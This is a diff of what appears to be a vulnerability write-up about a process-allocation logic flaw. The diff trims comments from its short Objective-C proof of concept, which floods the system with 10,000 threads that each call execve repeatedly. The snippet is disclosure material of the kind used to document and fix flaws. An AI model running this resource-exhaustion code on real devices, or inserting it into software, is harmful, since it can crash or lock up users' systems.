@@ -64,12 +64,10 @@ A logic flaw exists in process allocation.
 This issue can be resolved through improved logic and improved sandboxing.
 _Quick Poc:_
 ```Objc
-for(int i = 0; i < 10000; i++) { //We want to work with 10.000 asynchronous thread
+for(int i = 0; i < 10000; i++) {
     dispatch_async(dispatch_get_main_queue(), ^(void){
         [NSThread detachNewThreadWithBlock:^(void){
-              printf("Thread %d started.\n", syscall(SYS_gettid));
-              for(int j = 0; j < 10000; j++) //We want to allocate 10.000 at a time (final total: 100.000)
-              {
+              for(int j = 0; j < 10000; j++){
                 execve("/SMOKE/A/LOT/OF/POT", NULL, NULL);
               }
         }];
